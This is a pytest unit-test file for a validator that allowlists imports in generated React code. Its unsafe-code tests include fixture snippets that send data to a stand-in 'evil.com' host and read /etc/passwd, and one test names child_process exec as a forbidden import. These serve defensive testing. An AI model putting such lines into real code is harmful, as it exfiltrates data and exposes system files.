"""Unit tests for the AST Validator service."""

import pytest
from app.services.validator import (
    extract_base_module,
    extract_imports,
    validate_imports,
    is_code_safe,
    ALLOWED_MODULES,
)


class TestExtractBaseModule:
    """Tests for extract_base_module function."""

    def test_simple_module(self):
        assert extract_base_module("react") == "react"
        assert extract_base_module("recharts") == "recharts"

    def test_module_with_subpath(self):
        assert extract_base_module("recharts/lib/component") == "recharts"
        assert extract_base_module("react/jsx-runtime") == "react"

    def test_scoped_package(self):
        assert extract_base_module("@scope/package") == "@scope/package"
        assert extract_base_module("@codesandbox/sandpack-react") == "@codesandbox/sandpack-react"

    def test_scoped_package_with_subpath(self):
        assert extract_base_module("@scope/package/sub/path") == "@scope/package"


class TestExtractImports:
    """Tests for extract_imports function."""

    def test_simple_import(self):
        code = "import React from 'react';"
        assert extract_imports(code) == ["react"]

    def test_named_imports(self):
        code = "import { useState, useEffect } from 'react';"
        assert extract_imports(code) == ["react"]

    def test_multiple_imports(self):
        code = """
        import React from 'react';
        import { LineChart } from 'recharts';
        import { motion } from 'framer-motion';
        """
        imports = extract_imports(code)
        assert set(imports) == {"react", "recharts", "framer-motion"}

    def test_double_quotes(self):
        code = 'import React from "react";'
        assert extract_imports(code) == ["react"]

    def test_skip_relative_imports(self):
        code = """
        import React from 'react';
        import Component from './Component';
        import Utils from '../utils';
        """
        assert extract_imports(code) == ["react"]

    def test_dynamic_import(self):
        code = "const module = await import('lodash');"
        assert extract_imports(code) == ["lodash"]

    def test_require_statement(self):
        code = "const fs = require('fs');"
        assert extract_imports(code) == ["fs"]

    def test_import_with_subpath(self):
        code = "import { AreaChart } from 'recharts/lib/chart/AreaChart';"
        assert extract_imports(code) == ["recharts"]

    def test_no_imports(self):
        code = "const x = 1; console.log(x);"
        assert extract_imports(code) == []


class TestValidateImports:
    """Tests for validate_imports function."""

    def test_all_allowed(self):
        code = """
        import React from 'react';
        import { LineChart, XAxis, YAxis } from 'recharts';
        import { motion } from 'framer-motion';
        import clsx from 'clsx';
        """
        assert validate_imports(code) == []

    def test_forbidden_import(self):
        code = """
        import React from 'react';
        import axios from 'axios';
        """
        forbidden = validate_imports(code)
        assert "axios" in forbidden

    def test_multiple_forbidden(self):
        code = """
        import React from 'react';
        import axios from 'axios';
        import fs from 'fs';
        import { exec } from 'child_process';
        """
        forbidden = validate_imports(code)
        assert set(forbidden) == {"axios", "fs", "child_process"}

    def test_empty_code(self):
        assert validate_imports("") == []


class TestIsCodeSafe:
    """Tests for is_code_safe function."""

    def test_safe_code(self):
        code = """
        import React, { useState } from 'react';
        import { LineChart, Line, XAxis, YAxis } from 'recharts';
        
        export default function App() {
            const [data] = useState([
                { x: 1, y: 2 },
                { x: 2, y: 4 },
            ]);
            
            return (
                <LineChart width={400} height={300} data={data}>
                    <Line type="monotone" dataKey="y" stroke="#8884d8" />
                    <XAxis dataKey="x" />
                    <YAxis />
                </LineChart>
            );
        }
        """
        is_safe, forbidden = is_code_safe(code)
        assert is_safe is True
        assert forbidden == []

    def test_unsafe_code_with_axios(self):
        code = """
        import React from 'react';
        import axios from 'axios';
        
        export default function App() {
            axios.get('https://evil.com/steal-data');
            return <div>Malicious</div>;
        }
        """
        is_safe, forbidden = is_code_safe(code)
        assert is_safe is False
        assert "axios" in forbidden

    def test_unsafe_code_with_fs(self):
        code = """
        import React from 'react';
        const fs = require('fs');
        
        export default function App() {
            fs.readFileSync('/etc/passwd');
            return <div>Hacked</div>;
        }
        """
        is_safe, forbidden = is_code_safe(code)
        assert is_safe is False
        assert "fs" in forbidden


class TestAllowedModules:
    """Verify allowed modules list."""

    def test_expected_modules_allowed(self):
        expected = {"react", "recharts", "lucide-react", "framer-motion", "clsx", "tailwind-merge"}
        assert ALLOWED_MODULES == expected
